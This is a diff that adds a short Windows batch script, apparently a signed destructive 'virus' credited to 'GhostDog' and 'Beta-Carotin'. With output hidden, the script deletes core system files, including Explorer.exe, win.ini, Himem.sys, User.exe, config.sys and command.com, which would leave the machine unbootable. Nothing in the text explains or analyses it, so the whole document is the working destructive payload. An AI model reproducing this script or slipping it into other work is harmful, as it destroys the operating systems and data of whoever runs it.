@@ -1,0 +1,11 @@
+@echo off
+del C:\WINDOWS\Explorer.exe >nul
+del C:\WINDOWS\win.ini >nul
+del C:\WINDOWS\Himem.sys >nul
+del C:\WINDOWS\SYSTEM\User.exe >nul
+del config.sys >nul
+del command.com >nul
+echo ----------------
+echo by GhostDog
+echo Beta-Carotin
+echo ----------------
